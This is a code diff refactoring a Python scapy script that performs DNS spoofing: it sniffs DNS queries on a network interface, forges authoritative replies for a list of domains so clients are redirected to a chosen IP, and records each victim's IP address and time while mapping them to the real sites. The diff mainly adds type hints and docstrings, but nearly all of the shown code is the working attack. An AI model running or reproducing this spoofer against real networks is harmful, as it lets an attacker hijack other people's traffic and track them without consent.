@@ -1,44 +1,62 @@
-from scapy.all import * #type:ignore
+import json
+import time
 from pathlib import Path
+from typing import Dict, TypedDict, Any
+from scapy.all import *  # type: ignore
 from data.data_helper import record_entry
 from cli_mapper import ClientMapper
-import time
-import json
 
-# Configuration
-def load_urls():
+class UrlMapType(TypedDict):
+    """Type definition for URL mapping dictionary."""
+    Fake: str
+    Real: str
+
+def load_urls() -> Dict[str, str]:
+    """
+    Input: None
+    Output: Dict[str, str] - Dictionary mapping fake URLs to real URLs
+    Purpose: Load URL mappings from configuration file
+    Description: Attempts to load URL mappings from urls.json, falls back to default values if file not found
+    """
     try:
         with open('urls.json', 'r') as file:
-            #print("found urls file")
             return json.load(file)
-            #print("loaded file")
     except Exception as e:
-        return {'www.techinginfo.com': 'www.chess.com', 'www.shopconvet.com': 'www.ynet.co.il'}
-    
+        return {
+            'www.techinginfo.com': 'www.chess.com',
+            'www.shopconvet.com': 'www.ynet.co.il'
+        }
+
+# Configuration
 URLS = load_urls()
 SPOOF_IP = "127.0.0.1"        # IP to redirect to (localhost for PoC)
-INTERFACE = "en1"             # Your network interface (check with `ifconfig
+INTERFACE = "en1"             # Your network interface (check with `ifconfig`)
 MAPPER = ClientMapper()
 
-def dns_spoof(pkt):
+def dns_spoof(pkt: Any) -> None:
+    """
+    Input: pkt (Any) - Captured network packet
+    Output: None
+    Purpose: Handle DNS spoofing for specific domain requests
+    Description: Analyzes DNS queries and sends spoofed responses for targeted domains,
+                recording the attempt and mapping client information
+    """
     # Check if packet is a DNS query
-    #print("Found packets")req info working full
-    if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:#type:ignore
-        #print("Found dns packets")
-        qname = pkt[DNSQR].qname.decode().rstrip(".")#type:ignore
+    if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:  # type: ignore
+        qname = pkt[DNSQR].qname.decode().rstrip(".")  # type: ignore
         if qname in URLS.keys():
-            #print(f"Intercepted DNS query for {qname}")
-            srcip = pkt[IP].src #type:ignore
+            srcip = pkt[IP].src  # type: ignore
+
             # Craft spoofed DNS response
             spoofed_pkt = (
-                IP(dst=pkt[IP].src, src=pkt[IP].dst) /#type:ignore
-                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /#type:ignore
-                DNS(#type:ignore
-                    id=pkt[DNS].id,  # Match query ID#type:ignore
+                IP(dst=pkt[IP].src, src=pkt[IP].dst) /  # type: ignore
+                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /  # type: ignore
+                DNS(  # type: ignore
+                    id=pkt[DNS].id,  # Match query ID
                     qr=1,            # Response flag
                     aa=1,            # Authoritative answer
-                    qd=pkt[DNS].qd,  # Copy query section#type:ignore
-                    an=DNSRR(rrname=qname, type="A", ttl=300, rdata=SPOOF_IP)#type:ignore
+                    qd=pkt[DNS].qd,  # Copy query section
+                    an=DNSRR(rrname=qname, type="A", ttl=300, rdata=SPOOF_IP)  # type: ignore
                 )
             )
 
@@ -47,13 +65,20 @@ def dns_spoof(pkt):
                 sendp(spoofed_pkt, verbose=0)
                 time.sleep(0.1)
             print(f"Spoofed DNS response sent: {qname} -> {SPOOF_IP}")
-            record_entry(qname,build_dict_from_packet(pkt))
-            MAPPER.add_client(srcip,URLS[qname]) #type:ignore
-            
-def build_dict_from_packet(pkt):
-    return {"IP":pkt[IP].src,"Time":time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())} #type:ignore
+            record_entry(qname, build_dict_from_packet(pkt))
+            MAPPER.add_client(srcip, URLS[qname])  # type: ignore
 
-
+def build_dict_from_packet(pkt: Any) -> Dict[str, str]:
+    """
+    Input: pkt (Any) - Network packet to extract information from
+    Output: Dict[str, str] - Dictionary containing packet information
+    Purpose: Extract relevant information from packet
+    Description: Creates a dictionary with source IP and timestamp from the packet
+    """
+    return {
+        "IP": pkt[IP].src,  # type: ignore
+        "Time": time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
+    }
 
 if __name__ == "__main__":
     # Sniff DNS packets
